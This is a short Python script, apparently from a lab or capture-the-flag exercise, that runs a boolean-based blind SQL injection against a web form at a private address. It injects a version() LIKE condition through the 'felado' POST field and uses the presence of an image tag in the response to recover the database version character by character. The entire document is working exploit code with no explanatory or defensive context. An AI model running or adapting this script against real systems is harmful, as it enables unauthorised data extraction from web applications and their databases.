import requests

url = "http://10.10.8.11:8777/"
chars = "abcdefghijklmnopqrstuvwxyz01234567890."

ver = ""

while True:
    br = True
    for char in chars:
        expr = f"version() LIKE '{ver}{char}%'" #or @@version_comment
        data = {"felado": "' AND " + expr +";#"}
        resp = requests.post(url, data = data)
        found = "<img" in resp.text
        if found:
            ver = ver + char
            br = False
            print(ver)
            break
    if br:
        break
